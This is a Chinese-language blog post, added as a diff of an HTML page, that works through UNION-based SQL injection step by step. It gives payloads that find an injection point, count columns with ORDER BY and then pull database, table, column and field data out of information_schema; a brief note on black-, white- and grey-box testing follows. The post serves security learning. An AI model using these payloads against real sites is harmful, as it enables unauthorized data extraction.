@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.lug.ustc.edu.cn/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"liu1272.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"copycode":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":300},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":50,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/config.min.js"></script>
+
+    <meta name="description" content="SQL联合注入表现有回显且可进行联合查询 原理SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL联合注入">
+<meta property="og:url" content="https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Robin">
+<meta property="og:description" content="SQL联合注入表现有回显且可进行联合查询 原理SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-11T16:47:00.000Z">
+<meta property="article:modified_time" content="2023-03-12T02:21:30.000Z">
+<meta property="article:author" content="Shunyu">
+<meta property="article:tag" content="日报">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/","path":"2023/03/12/SQL联合注入/","title":"SQL联合注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL联合注入 | Robin</title>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/analytics/baidu-analytics.min.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?[object Object]"></script>
+
+  <script async src="//assets.growingio.com/2.1/gio.js"></script>
+  <script class="next-config" data-name="growingio_analytics" type="application/json">{"enable":false}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/analytics/growingio.min.js"></script>
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{&quot;token&quot;: &quot;[object Object]&quot;}'></script>
+
+  <script>
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "[object Object]");
+</script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Robin" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Robin</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">LiuGuobin's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">8</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">111</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">SQL联合注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A8%E7%8E%B0"><span class="nav-number">1.1.</span> <span class="nav-text">表现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">开始注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E6%98%AF%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%86%EF%BC%8C%E4%B8%80%E5%AE%9A%E8%A6%81%E5%AE%8C%E5%85%A8%E7%9C%8B%E6%87%82"><span class="nav-number">1.4.</span> <span class="nav-text">联合查询注入是最简单的了，一定要完全看懂</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%91%E7%9B%92%EF%BC%8C%E7%99%BD%E7%9B%92%EF%BC%8C%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="nav-number">2.</span> <span class="nav-text">黑盒，白盒，灰盒测试</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95%EF%BC%88%E6%B5%8B%E8%AF%95%E5%8A%9F%E8%83%BD%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">黑盒测试（测试功能）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95%EF%BC%88%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">白盒测试（优化程序）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95%EF%BC%88%E4%BF%AE%E5%A4%8Dbug%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">灰盒测试（修复bug）</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Shunyu"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Shunyu</p>
+  <div class="site-description" itemprop="description">Welcome</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">111</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/liu1272" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;liu1272" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1265257855@qq.com" title="E-Mail → mailto:1265257855@qq.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Shunyu">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Robin">
+      <meta itemprop="description" content="Welcome">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL联合注入 | Robin">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL联合注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-03-12 00:47:00 / 修改时间：10:21:30" itemprop="dateCreated datePublished" datetime="2023-03-12T00:47:00+08:00">2023-03-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%97%A5%E6%8A%A5/" itemprop="url" rel="index"><span itemprop="name">日报</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span id="/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" class="post-meta-item leancloud_visitors" data-flag-title="SQL联合注入" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>4 分钟</span>
+    </span>
+</div>
+
+
+          # 置顶图标
+          
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="SQL联合注入"><a href="#SQL联合注入" class="headerlink" title="SQL联合注入"></a>SQL联合注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>有回显且可进行联合查询</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。</p>
+<h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>1、判断是否存在注入点<br>（1）修改参数值，查看数据是否改变<br>（2）插入单、双引号的检测方法，未闭合的单引号会有报错</p>
+<p>2、判断注入点是整形还是字符型<br>（1）数字型：通过</p>
+<pre><code>and 1=1
+</code></pre>
+<p>（2）字符串型：闭合单引号测试语句</p>
+<pre><code>&#39;and&#39;1&#39;=&#39;1
+</code></pre>
+<p>3、判断查询列数</p>
+<pre><code>select username,password from where username=&#39;root&#39; and password=123 order by x
+</code></pre>
+<p>当输入x报错时，真实的列数是「x-1」<br>(1)为什么用order by 可以证明前面语句查询了三列数据呢？<br>&emsp;&emsp;select * from order by (你要按照排序的对象)<br>&emsp;&emsp;order by可以按照指定的「字段名」排序<br>&emsp;&emsp;还可以按照「索引」进行排序，索引就是从左至右将列名按照123排序<br>&emsp;&emsp;对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1<br>&emsp;&emsp;当输入的索引溢出时它就会报错。<br>(2)我们为什么要知道前面查询了多少语句呢？<br>&emsp;&emsp;因为union前面查询语句查询的元素与后面查询语句查询的元素要在数量上一样<br>&emsp;&emsp;select 甲,乙,丙 union select 1,2,3<br>&emsp;&emsp;因为前面查询的语句有三个元素（甲，乙，丙）<br>&emsp;&emsp;所以后面查询的语句必须是三个元素（1，2，3）</p>
+<p>4、找到显示位</p>
+<pre><code>?id=-1 union select 1,2,3,4,5,6 --+
+</code></pre>
+<p>如果在使用UNION SELECT 1,2,3…,11 from table时，网页中显示了信息8<br>那么说明网页只能够显示第8列中信息，不能显示其他列的信息。<br>也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。<br>所以如果我们想要知道某个属性的值，比如admin；<br>就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。<br>但是为了爆出第一位后面的显示位需要隐藏正常结果<br>比如将id=1改为id=-1，使union前面的语句报错，执行后面的，爆出显示位</p>
+<p>5、利用显示位获取库名</p>
+<pre><code>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
+</code></pre>
+<p>在高版本中查询该表就行，具体看上一篇文章。<br>group_concat()函数将所有查询的库名连在一起成为一条数据</p>
+<pre><code>?id=-1&#39; union select 1,database(),3 --+
+</code></pre>
+<p>假设判断出在2号位显示，那么在二号位换成想插入的SQL语句就行了。<br>相同的，这里也要让union前面的语句报错，执行后面的。</p>
+<p>6、获取表名</p>
+<pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;库名&#39; --+
+</code></pre>
+<p>相同的，这里也要让union前面的语句报错，执行后面的。<br>group_concat()函数将所有查询的表名连在一起成为一条数据</p>
+<p>7、查询表中列名</p>
+<pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; --+
+</code></pre>
+<p>数据库有个information_schema库，里面有个columns表，存有整个数据库的列名。<br>我们要去查找的列，就是在这个库中去找。</p>
+<p>8、获取字段信息</p>
+<pre><code>?id=-1’ union select 1,group_concat(列名),3 from 库名.表名 --+
+</code></pre>
+<p>平平无奇，跟上面的没啥不同，等价于下面这条</p>
+<pre><code>?id=-1’ union select 1,列名,3 from 库名.表名 limit 0,1 --+
+</code></pre>
+<h4 id="联合查询注入是最简单的了，一定要完全看懂"><a href="#联合查询注入是最简单的了，一定要完全看懂" class="headerlink" title="联合查询注入是最简单的了，一定要完全看懂"></a>联合查询注入是最简单的了，一定要完全看懂</h4><h3 id="黑盒，白盒，灰盒测试"><a href="#黑盒，白盒，灰盒测试" class="headerlink" title="黑盒，白盒，灰盒测试"></a>黑盒，白盒，灰盒测试</h3><h4 id="黑盒测试（测试功能）"><a href="#黑盒测试（测试功能）" class="headerlink" title="黑盒测试（测试功能）"></a>黑盒测试（测试功能）</h4><p>黑盒测试是以用户的角度，从输入数据与输出数据的对应关系出发进行测试的。<br>目的是检测程序是否能适当地接收输入数据而产生正确的输出信息。<br>很明显，如果外部特性本身设计有问题或规格说明的规定有误，用黑盒测试方法是发现不了的。</p>
+<h4 id="白盒测试（优化程序）"><a href="#白盒测试（优化程序）" class="headerlink" title="白盒测试（优化程序）"></a>白盒测试（优化程序）</h4><p>以开发者的角度，对程序内部细节的严密检验</p>
+<h4 id="灰盒测试（修复bug）"><a href="#灰盒测试（修复bug）" class="headerlink" title="灰盒测试（修复bug）"></a>灰盒测试（修复bug）</h4><p>多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。<br>灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑。<br>常常是通过一些表征性的现象、事件、标志来判断内部的运行状态。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="Shunyu 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="Shunyu 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E6%97%A5%E6%8A%A5/" rel="tag"><i class="fa fa-tag"></i> 日报</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" rel="prev" title="SQL注入前置知识及注入原理">
+                  <i class="fa fa-angle-left"></i> SQL注入前置知识及注入原理
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/" rel="next" title="SQL布尔盲注(延时注入后面再写)">
+                  SQL布尔盲注(延时注入后面再写) <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="valine-comments"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Shunyu</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">157k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">9:31</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/liu1272" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/comments.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/motion.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/sidebar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/next-boot.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/bookmark.min.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/search/local-search.min.js"></script>
+
+  <script class="next-config" data-name="pdf" type="application/json">{"object_url":{"url":"https://cdnjs.cloudflare.com/ajax/libs/pdfobject/2.3.0/pdfobject.min.js","integrity":"sha256-JJZNsid68vnh3/zyj0lY9BN5ynxVX/12XgOa1TlaYN0="},"url":"/lib/pdf/web/viewer.html"}</script>
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/tags/pdf.min.js"></script>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/hexo-theme-next@8.22.0/source/js/third-party/fancybox.min.js"></script>
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+<script class="next-config" data-name="valine" type="application/json">{"enable":true,"appId":"Saj0Y9foXlqnIK4Ing0paYci-MdYXbMMI","appKey":"eSefitZxNdI9H6p6lkyRYI5g","serverURLs":"https://saj0y9fo.api.lncldglobal.com","placeholder":"Just go go","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-cn","visitor":true,"comment_count":true,"recordIP":true,"enableQQ":true,"requiredFields":[],"el":"#valine-comments","path":"/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"}</script>
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.valine.el)
+    .then(() => NexT.utils.getScript(
+      'https://fastly.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js',
+      { condition: window.Valine }
+    ))
+    .then(() => {
+      new Valine(CONFIG.valine);
+    });
+});
+</script>
+
+
+</body>
+</html>
